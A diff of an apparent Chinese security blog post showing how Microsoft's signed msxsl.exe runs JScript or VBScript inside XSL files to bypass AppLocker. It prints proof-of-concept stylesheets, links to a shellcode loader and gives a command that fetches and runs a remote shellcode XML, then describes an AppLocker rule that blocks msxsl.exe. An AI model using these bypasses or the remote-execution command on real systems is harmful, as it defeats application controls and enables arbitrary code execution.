@@ -1,0 +1,255 @@
+I"�"<h2 id="0x00-前言">0x00 前言</h2>
+<hr />
+
+<p>Casey Smith@subTee在twitter分享的一个技巧，使用包含微软签名的msxsl.exe能够执行JScript代码，从而实现对Applocker的绕过。</p>
+
+<p>如图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-11/1-1.png" alt="Alt text" /></p>
+
+<p><strong>twitter地址如下：</strong></p>
+
+<p>https://twitter.com/subTee/status/877616321747271680</p>
+
+<p><strong>POC地址如下：</strong></p>
+
+<p>https://gist.github.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr />
+
+<p>本文将要对这项技术进行介绍，分析可供进一步利用的方法，同时对其扩展，介绍使用msxsl.exe执行VBScript代码的方式</p>
+
+<h2 id="0x02-msxsl">0x02 msxsl</h2>
+<hr />
+
+<h3 id="1msxslexe">1、msxsl.exe</h3>
+
+<ul>
+  <li>XSL(Extensible Stylesheet Language)转换器</li>
+  <li>命令行工具</li>
+  <li>带有微软数字签名</li>
+</ul>
+
+<p><strong>下载地址：</strong></p>
+
+<p>https://www.microsoft.com/en-us/download/details.aspx?id=21714</p>
+
+<p>执行如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-11/2-1.png" alt="Alt text" /></p>
+
+<p>参考Casey Smith的POC:</p>
+
+<p>customers.xml:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0"?&gt;
+&lt;?xml-stylesheet type="text/xsl" href="script.xsl" ?&gt;
+&lt;customers&gt;
+   &lt;customer&gt;
+      &lt;name&gt;John Smith&lt;/name&gt;
+      &lt;address&gt;123 Elm St.&lt;/address&gt;
+      &lt;phone&gt;(123) 456-7890&lt;/phone&gt;
+   &lt;/customer&gt;
+   &lt;customer&gt;
+      &lt;name&gt;Mary Jones&lt;/name&gt;
+      &lt;address&gt;456 Oak Ave.&lt;/address&gt;
+      &lt;phone&gt;(156) 789-0123&lt;/phone&gt;
+   &lt;/customer&gt;
+&lt;/customers&gt;
+</code></pre></div></div>
+
+<p>script.xml:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version='1.0'?&gt;
+&lt;xsl:stylesheet version="1.0"
+      xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+      xmlns:msxsl="urn:schemas-microsoft-com:xslt"
+      xmlns:user="http://mycompany.com/mynamespace"&gt;
+
+&lt;msxsl:script language="JScript" implements-prefix="user"&gt;
+   function xml(nodelist) {
+	var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
+      return nodelist.nextNode().xml;
+	  
+   }
+&lt;/msxsl:script&gt;
+&lt;xsl:template match="/"&gt;
+   &lt;xsl:value-of select="user:xml(.)"/&gt;
+&lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;
+</code></pre></div></div>
+
+<p>成功执行JScript代码，弹出计算器，poc执行如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-11/2-2.png" alt="Alt text" /></p>
+
+<p>开启Applocker，添加规则拦截js脚本的执行，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-11/2-3.png" alt="Alt text" /></p>
+
+<p>但是使用msxsl仍然能够执行JScript代码</p>
+
+<p>在之前的文章<a href="https://3gstudent.github.io/%E5%88%A9%E7%94%A8JS%E5%8A%A0%E8%BD%BD.Net%E7%A8%8B%E5%BA%8F">《利用JS加载.Net程序》</a>介绍过利用JScript脚本加载.Net程序的方法，结合本文，可以得出推论：</p>
+
+<p><strong>使用msxsl也能够执行c#代码</strong></p>
+
+<p>具体来说，能够实现以下功能：</p>
+
+<ul>
+  <li>执行shellcode</li>
+  <li>执行mimikatz</li>
+  <li>执行powershell脚本</li>
+</ul>
+
+<h3 id="2执行shellcode">2、执行shellcode</h3>
+
+<p>可参照Cn33liz的StarFighters，地址如下：</p>
+
+<p>https://github.com/Cn33liz/StarFighters/blob/master/StarFighter.js</p>
+
+<p>结合Casey的POC，就能够实现利用msxsl执行shellcode</p>
+
+<p>完整代码我已经上传至github，地址如下：</p>
+
+<p>https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker/blob/master/shellcode.xml</p>
+
+<p>测试如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-11/3-1.png" alt="Alt text" /></p>
+
+<p>对于执行mimikatz和powershell脚本，思路可参照之前的文章<a href="https://3gstudent.github.io/%E5%88%A9%E7%94%A8JS%E5%8A%A0%E8%BD%BD.Net%E7%A8%8B%E5%BA%8F">《利用JS加载.Net程序》</a></p>
+
+<h2 id="0x03-脚本优化">0x03 脚本优化</h2>
+<hr />
+
+<p>分析xml文件格式，对Casey的POC作适当优化</p>
+
+<h3 id="1精简customersxml">1、精简customers.xml</h3>
+
+<p>XML元素命名规则：</p>
+
+<ul>
+  <li>名称可以含字母、数字以及其他的字符</li>
+  <li>名称不能以数字或者标点符号开始</li>
+  <li>名称不能以字符 “xml”（或者 XML、Xml）开始</li>
+  <li>名称不能包含空格</li>
+  <li>可使用任何名称，没有保留的字词</li>
+</ul>
+
+<p>原POC内容如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0"?&gt;
+&lt;?xml-stylesheet type="text/xsl" href="script.xsl" ?&gt;
+&lt;customers&gt;
+   &lt;customer&gt;
+      &lt;name&gt;John Smith&lt;/name&gt;
+      &lt;address&gt;123 Elm St.&lt;/address&gt;
+      &lt;phone&gt;(123) 456-7890&lt;/phone&gt;
+   &lt;/customer&gt;
+   &lt;customer&gt;
+      &lt;name&gt;Mary Jones&lt;/name&gt;
+      &lt;address&gt;456 Oak Ave.&lt;/address&gt;
+      &lt;phone&gt;(156) 789-0123&lt;/phone&gt;
+   &lt;/customer&gt;
+&lt;/customers&gt;
+</code></pre></div></div>
+
+<p>经分析，参数1中的xml文件不重要，元素可以任意指定</p>
+
+<p>去掉不相关的参数，重新命名一个xml元素，精简后代码如下：</p>
+
+<p><code class="language-plaintext highlighter-rouge">&lt;a&gt;&lt;/a&gt;</code></p>
+
+<p>并且，如果为了少创建文件，使用script.xsl作为第一个xml文件参数也是可以的</p>
+
+<p>例如,参数如下：</p>
+
+<p><code class="language-plaintext highlighter-rouge">msxsl.exe script.xsl script.xsl</code></p>
+
+<p>执行成功，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-11/3-2.png" alt="Alt text" /></p>
+
+<h3 id="2优化scriptxsl">2、优化script.xsl</h3>
+
+<p>执行VBScript代码：</p>
+
+<p><strong>注：</strong></p>
+
+<p>经测试，此xml脚本不支持CSharp，同该资料相违背，此问题有待解决</p>
+
+<p>资料地址如下：</p>
+
+<p>https://msdn.microsoft.com/en-us/library/533texsx(VS.71).aspx</p>
+
+<p>对于VBScript语言，不支持return表示函数返回值，通过函数名=需要返回的值来表示函数返回值</p>
+
+<p>完整内容如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version='1.0'?&gt;
+&lt;xsl:stylesheet version="1.0"
+      xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+      xmlns:msxsl="urn:schemas-microsoft-com:xslt"
+      xmlns:user="urn:my-scripts"&gt;
+
+&lt;msxsl:script language="VBScript" implements-prefix="user"&gt;
+function myFunction()
+	set shell=createobject("wscript.shell")
+	shell.run "calc.exe",0
+	myFunction = 0
+end function
+
+&lt;/msxsl:script&gt;
+&lt;xsl:template match="/"&gt;
+&lt;xsl:value-of select="user:myFunction()"/&gt;
+&lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;
+</code></pre></div></div>
+
+<p>以上文件内容对应github地址：https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker/blob/master/VBScript.xml</p>
+
+<p><strong>注：</strong></p>
+
+<p>调用函数名要对应：</p>
+
+<p><code class="language-plaintext highlighter-rouge">&lt;xsl:value-of select="user:myFunction()"/&gt;</code></p>
+
+<h3 id="3远程执行">3、远程执行</h3>
+
+<p>msxsl.exe也支持远程执行，参数如下：</p>
+
+<p><code class="language-plaintext highlighter-rouge">msxls.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml</code></p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-11/3-3.png" alt="Alt text" /></p>
+
+<p><strong>注：</strong></p>
+
+<p>该方法是从Evi1cg学来的，博客地址：https://evi1cg.me/archives/AppLocker_Bypass_MSXSL.html</p>
+
+<h2 id="0x04-防御">0x04 防御</h2>
+<hr />
+
+<p>添加Applocker的可执行规则，指定msxsl.exe</p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-11/4-1.png" alt="Alt text" /></p>
+
+<p>即使更改文件路径，msxsl.exe仍然无法执行</p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-11/4-2.png" alt="Alt text" /></p>
+
+<h2 id="0x05-小结">0x05 小结</h2>
+<hr />
+
+<p>本文介绍了利用msxsl绕过AppLocker的方法，但是通过定制AppLocker规则，还是能够限制该方法的使用。</p>
+
+<hr />
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+:ET
